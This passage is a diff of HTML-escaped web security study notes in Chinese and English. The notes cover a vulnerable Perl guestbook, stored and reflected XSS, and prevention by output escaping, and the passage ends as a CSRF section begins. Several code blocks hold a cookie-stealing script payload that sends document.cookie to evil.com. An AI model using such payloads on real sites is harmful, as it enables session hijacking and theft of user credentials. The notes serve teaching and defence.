class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;gt;guestbook.log&amp;quot;&lt;/span&gt; ) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt;   //Open the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;Cannot open guestbook&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, hr(), &lt;span class=&#34;string&#34;&gt;&amp;quot;From: &amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       a( &amp;#123; &lt;span class=&#34;string&#34;&gt;-href =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;mailto:&lt;span class=&#34;variable&#34;&gt;$email&lt;/span&gt;&amp;quot;&lt;/span&gt; &amp;#125;, &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; ), br(), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;variable&#34;&gt;$message&lt;/span&gt; );    &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt; Store the user entered data in the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;close&lt;/span&gt;( FILE );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;open&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;guestbook.log&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;Cannot open guestbook&amp;quot;&lt;/span&gt; );   &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt;Open the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &amp;lt;FILE&amp;gt; );      &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt;Display the contents of the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;close&lt;/span&gt;( FILE );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( h4( &lt;span class=&#34;string&#34;&gt;&amp;quot;Please sign our guestbook:&amp;quot;&lt;/span&gt; ), start_form(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;, textfield( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; ), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;E-mail: &amp;quot;&lt;/span&gt;, textfield( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; ), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;Enter your message:&amp;quot;&lt;/span&gt;, br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     textarea( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-rows =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-columns =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-wrap =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     br(), submit( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Sign the Guestbook&amp;quot;&lt;/span&gt; ), end_form(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     end_html() );&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;该 Perl 脚本是一个基本的访客留言簿程序，允许用户输入姓名、电子邮件和消息并将其保存到日志文件 (guestbook.log) 中。程序还可以读取并显示日志文件的内容&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;用户输入未过滤：程序直接使用用户输入来生成 HTML 输出和写入日志文件，没有进行任何过滤或转义，容易导致跨站脚本攻击（XSS）。&lt;ul&gt;
-&lt;li&gt;例如，用户在 &lt;code&gt;name&lt;/code&gt; 或 &lt;code&gt;message&lt;/code&gt; 输入字段中插入 &lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;XSS&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;，这段恶意代码将会在其他用户查看留言簿时被执行。&lt;/li&gt;
-&lt;li&gt;或是在留言时插入HTML改变页面布局&lt;/li&gt;
+&lt;li&gt;用户输入未过滤：程序直接使用用户输入来生成 HTML 输出和写入日志文件，没有进行任何过滤或转义，容易导致跨站脚本攻击（XSS）。
+&lt;ul&gt;
+&lt;li&gt;例如，用户在  &lt;code&gt;name&lt;/code&gt;  或  &lt;code&gt;message&lt;/code&gt;  输入字段中插入  &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt; ，这段恶意代码将会在其他用户查看留言簿时被执行。&lt;/li&gt;
+&lt;li&gt;或是在留言时插入 HTML 改变页面布局&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;日志文件的可写性：&lt;br&gt;程序将用户的输入附加到日志文件 guestbook.log，但没有验证文件是否存在或是否已被修改，可能会导致文件篡改或覆盖攻击。&lt;br&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340e28890.png&#34; alt=&#34;img&#34;&gt;&lt;table&gt;
+&lt;li&gt;日志文件的可写性：&lt;br&gt;
+程序将用户的输入附加到日志文件 guestbook.log，但没有验证文件是否存在或是否已被修改，可能会导致文件篡改或覆盖攻击。&lt;br&gt;
+&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340e28890.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th align=&#34;center&#34;&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340ddbbb1.png&#34; alt=&#34;Image 1&#34;&gt;&lt;/th&gt;
-&lt;th align=&#34;center&#34;&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340b9e2cd.png&#34; alt=&#34;Image 2&#34;&gt;&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340ddbbb1.png&#34; alt=&#34;Image 1&#34;&gt;&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340b9e2cd.png&#34; alt=&#34;Image 2&#34;&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;/table&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
 &lt;h2 id=&#34;Reflected (Non-Persistent) XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Reflected (Non-Persistent) XSS Attacks&#34;&gt;#&lt;/a&gt;Reflected (Non-Persistent) XSS Attacks&lt;/h2&gt;
-
 &lt;ol&gt;
-&lt;li&gt;Data supplied by an attacker is displayed in the response page &lt;strong&gt;without being stored on a server&lt;/strong&gt;&lt;br&gt;If the user input is displayed in the page&lt;ul&gt;
-&lt;li&gt;HTML tags can mess up the look of the page &lt;/li&gt;
-&lt;li&gt;JavaScript can steal information or cause more advanced malicious behaviour  &lt;/li&gt;
+&lt;li&gt;Data supplied by an attacker is displayed in the response page &lt;strong&gt;without being stored on a server&lt;/strong&gt;&lt;br&gt;
+If the user input is displayed in the page
+&lt;ul&gt;
+&lt;li&gt;HTML tags can mess up the look of the page&lt;/li&gt;
+&lt;li&gt;JavaScript can steal information or cause more advanced malicious behaviour&lt;/li&gt;
 &lt;li&gt;For only the current user&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Example&lt;br&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672236eb773d1.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
+&lt;li&gt;Example&lt;br&gt;
+&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672236eb773d1.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;恶意网页（evil.com）&lt;br&gt;攻击者在 &lt;code&gt;evil.com&lt;/code&gt; 上创建了一个包含恶意代码的网页。&lt;br&gt;页面中包含了一个指向目标网站的链接或表单，其中含有恶意的 JavaScript 代码。例如：&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://naive.com/hello.cgi?name=&amp;lt;script&amp;gt;win.open(&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27; + document.cookie)&amp;lt;/script&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-链接中的 &lt;code&gt;name&lt;/code&gt; 参数是用来注入 JavaScript 代码的。代码试图将用户的 &lt;code&gt;cookie&lt;/code&gt; 信息发送到攻击者的服务器（即 &lt;code&gt;evil.com&lt;/code&gt; 的 &lt;code&gt;steal.cgi&lt;/code&gt; 脚本）。&lt;/li&gt;
-&lt;li&gt;受害者点击了恶意链接并访问了目标网页。&lt;br&gt;浏览器向 naive.com 发送请求，其中包含了恶意的 name 参数。请求的样式为：&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable constant_&#34;&gt;GET&lt;/span&gt; /hello.&lt;span class=&#34;property&#34;&gt;cgi&lt;/span&gt;?name=&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
-&lt;li&gt;目标网站（naive.com）&lt;br&gt;目标网站 naive.com 将用户输入的 name 参数原封不动地嵌入到了响应的 HTML 页面中。响应页面可能是这样：&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;Hello, dear &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;. Welcome!&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-由于未对输入进行过滤，浏览器将 &lt;code&gt;script&lt;/code&gt; 标签作为普通的 JavaScript 代码执行。&lt;/li&gt;
-&lt;li&gt;结果&lt;ul&gt;
-&lt;li&gt;浏览器执行了恶意 JavaScript 代码，打开了一个新的窗口并向 &lt;code&gt;evil.com/steal.cgi&lt;/code&gt; 发送了用户的 &lt;code&gt;cookie&lt;/code&gt; 信息。&lt;/li&gt;
+&lt;li&gt;恶意网页（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V2aWwuY29t&#34;&gt;evil.com&lt;/span&gt;）&lt;br&gt;
+攻击者在  &lt;code&gt;evil.com&lt;/code&gt;  上创建了一个包含恶意代码的网页。&lt;br&gt;
+页面中包含了一个指向目标网站的链接或表单，其中含有恶意的 JavaScript 代码。例如：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://naive.com/hello.cgi?name=&amp;lt;script&amp;gt;win.open(&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27; + document.cookie)&amp;lt;/script&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;链接中的  &lt;code&gt;name&lt;/code&gt;  参数是用来注入 JavaScript 代码的。代码试图将用户的  &lt;code&gt;cookie&lt;/code&gt;  信息发送到攻击者的服务器（即  &lt;code&gt;evil.com&lt;/code&gt;  的  &lt;code&gt;steal.cgi&lt;/code&gt;  脚本）。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;受害者点击了恶意链接并访问了目标网页。&lt;br&gt;
+浏览器向 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt; 发送请求，其中包含了恶意的 name 参数。请求的样式为：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable constant_&#34;&gt;GET&lt;/span&gt; /hello.&lt;span class=&#34;property&#34;&gt;cgi&lt;/span&gt;?name=&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;目标网站（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt;）&lt;br&gt;
+目标网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt; 将用户输入的 name 参数原封不动地嵌入到了响应的 HTML 页面中。响应页面可能是这样：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;Hello, dear &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;. Welcome!&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;由于未对输入进行过滤，浏览器将  &lt;code&gt;script&lt;/code&gt;  标签作为普通的 JavaScript 代码执行。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;结果
+&lt;ul&gt;
+&lt;li&gt;浏览器执行了恶意 JavaScript 代码，打开了一个新的窗口并向  &lt;code&gt;evil.com/steal.cgi&lt;/code&gt;  发送了用户的  &lt;code&gt;cookie&lt;/code&gt;  信息。&lt;/li&gt;
 &lt;li&gt;攻击者通过这种方式获取了受害者的敏感信息（例如身份验证 cookie），并可能进一步进行会话劫持。&lt;/li&gt;
 &lt;li&gt;违反同源策略（SOP）：同源策略（Same-Origin Policy）旨在保护用户的浏览器不被恶意脚本跨站攻击，XSS 攻击直接违反了这一策略&lt;/li&gt;
 &lt;/ul&gt;
@@ -136,18 +166,20 @@
 &lt;li&gt;Reflected XSS Attack Details&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;User is tricked into visiting an honest website &lt;/li&gt;
-&lt;li&gt;Bug in website code causes user’s browser to execute an arbitrary attack script &lt;ul&gt;
+&lt;li&gt;User is tricked into visiting an honest website&lt;/li&gt;
+&lt;li&gt;Bug in website code causes user’s browser to execute an arbitrary attack script
+&lt;ul&gt;
 &lt;li&gt;The origin of this script is now the website itself&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Script can request sensitive data, control form fields on this page and linked pages &lt;ul&gt;
-&lt;li&gt;Can cause user’s browser to attack other websites&lt;br&gt;Example: MySpace.com phishing attack injects a fake password field that sends password to attacker&lt;/li&gt;
+&lt;li&gt;Script can request sensitive data, control form fields on this page and linked pages
+&lt;ul&gt;
+&lt;li&gt;Can cause user’s browser to attack other websites&lt;br&gt;
+Example: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL015U3BhY2UuY29t&#34;&gt;MySpace.com&lt;/span&gt; phishing attack injects a fake password field that sends password to attacker&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id=&#34;Stored XSS VS Reflected XSS&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stored XSS VS Reflected XSS&#34;&gt;#&lt;/a&gt;Stored XSS VS Reflected XSS&lt;/h2&gt;
-
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -156,7 +188,8 @@
 &lt;th&gt;反射型 XSS (Reflected XSS)&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
-&lt;tbody&gt;&lt;tr&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
 &lt;td&gt;代码存储&lt;/td&gt;
 &lt;td&gt;服务器端持久存储&lt;/td&gt;
 &lt;td&gt;仅在请求中反射&lt;/td&gt;
@@ -181,43 +214,47 @@
 &lt;td&gt;难度较大，需清理服务器上的恶意代码&lt;/td&gt;
 &lt;td&gt;难度较小，可通过输入验证和转义快速修复&lt;/td&gt;
 &lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
 &lt;h2 id=&#34;Preventing XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Preventing XSS Attacks&#34;&gt;#&lt;/a&gt;Preventing XSS Attacks&lt;/h2&gt;
-
 &lt;ol&gt;
-&lt;li&gt;Input Filtering&lt;br&gt;还没懂先放个链接在这&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQuaHRtbA==&#34;&gt;XSS Filter Evasion Cheat Sheet&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;Input Filtering&lt;br&gt;
+ 还没懂先放个链接在这&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQuaHRtbA==&#34;&gt; XSS Filter Evasion Cheat Sheet&lt;/span&gt;&lt;/li&gt;
 &lt;li&gt;Framework validation&lt;/li&gt;
 &lt;li&gt;Output Sanitisation&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;Any user input and client-side data must be preprocessed before it is used inside HTML&lt;ul&gt;
-&lt;li&gt;PHP: &lt;code&gt;htmlspecialchars(string)&lt;/code&gt; replaces all special characters with their HTML code例如，将 &lt;code&gt;&amp;lt;&lt;/code&gt; 转换为 &lt;code&gt;&amp;amp;lt;&lt;/code&gt;，&lt;code&gt;&amp;gt;&lt;/code&gt; 转换为 &lt;code&gt;&amp;amp;gt;&lt;/code&gt;，以防止这些字符被浏览器解释为 HTML 或脚本标签。 &lt;/li&gt;
-&lt;li&gt;ASP.NET: &lt;code&gt;Server.HtmlEncode(string)&lt;/code&gt; 该方法会将字符串中的特殊字符转换为 HTML 实体，确保浏览器不会将其解释为可执行代码。&lt;/li&gt;
+&lt;li&gt;Any user input and client-side data must be preprocessed before it is used inside HTML
+&lt;ul&gt;
+&lt;li&gt;PHP:  &lt;code&gt;htmlspecialchars(string)&lt;/code&gt;  replaces all special characters with their HTML code 例如，将  &lt;code&gt;&amp;lt;&lt;/code&gt;  转换为  &lt;code&gt;&amp;amp;lt;&lt;/code&gt; ， &lt;code&gt;&amp;gt;&lt;/code&gt;  转换为  &lt;code&gt;&amp;amp;gt;&lt;/code&gt; ，以防止这些字符被浏览器解释为 HTML 或脚本标签。&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0FTUC5ORVQ=&#34;&gt;ASP.NET&lt;/span&gt;:  &lt;code&gt;Server.HtmlEncode(string)&lt;/code&gt;  该方法会将字符串中的特殊字符转换为 HTML 实体，确保浏览器不会将其解释为可执行代码。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;过滤可能会将输入转换成攻击形式&lt;ul&gt;
+&lt;li&gt;过滤可能会将输入转换成攻击形式
+&lt;ul&gt;
 &lt;li&gt;如果预处理过程中未彻底消除所有潜在威胁，有可能仍会导致 XSS 等攻击。&lt;/li&gt;
 &lt;li&gt;需要在过滤后多次循环检查，并在检测到恶意内容时重新应用过滤，直到不再发现潜在威胁为止。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;h1 id=&#34;Cross-Site Request Forgery&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Cross-Site Request Forgery&#34;&gt;#&lt;/a&gt;Cross-Site Request Forgery&lt;/h1&gt;
-
 &lt;h2 id=&#34;CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#CSRF&#34;&gt;#&lt;/a&gt;CSRF&lt;/h2&gt;
-
 &lt;ol&gt;
 &lt;li&gt;Cross-Site Request Forgery (CSRF)&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;A privileged user is tricked to perform an operation on the behalf of an attacker &lt;ul&gt;
+&lt;li&gt;A privileged user is tricked to perform an operation on the behalf of an attacker
+&lt;ul&gt;
 &lt;li&gt;Often through social engineering (such as sending a link via email or chat)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Usually unnoticed by the victim user &lt;ul&gt;
